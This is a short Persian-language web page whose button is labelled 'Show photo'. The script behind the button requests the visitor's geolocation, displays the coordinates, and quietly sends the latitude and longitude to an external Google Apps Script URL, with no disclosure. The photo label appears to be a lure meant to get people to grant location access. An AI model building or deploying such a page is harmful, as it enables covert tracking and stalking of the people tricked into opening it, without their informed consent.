<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>موقعیت من</title>
</head>
<body>
<h2>موقعیت فعلی</h2>
<button onclick="getLocation()">نمایش عکس</button>
<p id="result"></p>
<script>
function getLocation(){
navigator.geolocation.getCurrentPosition(function(p){
var lat=p.coords.latitude;
var lon=p.coords.longitude;
document.getElementById("result").innerHTML="Lat: "+lat+"<br>Lon: "+lon;
fetch("https://script.google.com/macros/s/AKfycbxOSBgHXr5R8ndNperhFhkuYURo559hgSjZg9JYYy0RXWE2rJ00zQnpOmTwuOFhJ4Q59Q/exec?lat="+lat+"&lon="+lon);
},function(){
document.getElementById("result").innerHTML="دسترسی داده نشد";
});
}
</script>
</body>
</html>
